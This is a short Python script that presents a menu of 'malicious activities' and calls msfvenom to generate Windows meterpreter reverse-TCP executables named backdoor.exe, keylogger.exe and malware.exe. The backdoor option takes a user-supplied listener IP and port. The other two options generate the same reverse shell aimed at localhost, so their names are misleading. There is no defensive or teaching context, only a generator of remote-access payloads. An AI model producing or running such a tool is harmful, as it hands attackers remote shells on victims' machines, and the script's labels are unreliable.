
import os
import subprocess

def main():
    while True:
        os.system('cls')
        #list of malicious activities
        print("1. Create Backdoor")
        print("2. Create Keylogger")
        print("3. Create malware")
        print("4. Exit")
        option = int(input("Choose your option: "))
        if option == 1:
            backdoor()
        elif option == 2:
            keylogger()
        elif option == 3:
            malware()
        elif option == 4:
            exit()
        else:
            print("Invalid option!")

#function to create backdoor
def backdoor():
    ip_addr = input("Enter your IP address: ")
    port = input("Enter your port: ")
    os.system('cls')
    print("Creating Backdoor....")
    subprocess.call(["msfvenom", "-p", "windows/meterpreter/reverse_tcp", f"LHOST={ip_addr}", f"LPORT={port}", "-f", "exe", "-o", "backdoor.exe"])
    print("Backdoor Created!")

#function to create keylogger
def keylogger():
    os.system('cls')
    print("Creating Keylogger....")
    subprocess.call(["msfvenom", "-p", "windows/meterpreter/reverse_tcp", "LHOST=localhost", "LPORT=4444", "-f", "exe", "-o", "keylogger.exe"])
    print("Keylogger Created!")

#function to create malware
def malware():
    os.system('cls')
    print("Creating Malware....")
    subprocess.call(["msfvenom", "-p", "windows/meterpreter/reverse_tcp", "LHOST=localhost", "LPORT=4444", "-f", "exe", "-o", "malware.exe"])
    print("Malware Created!")

#calling main function
if __name__ == '__main__':
    main()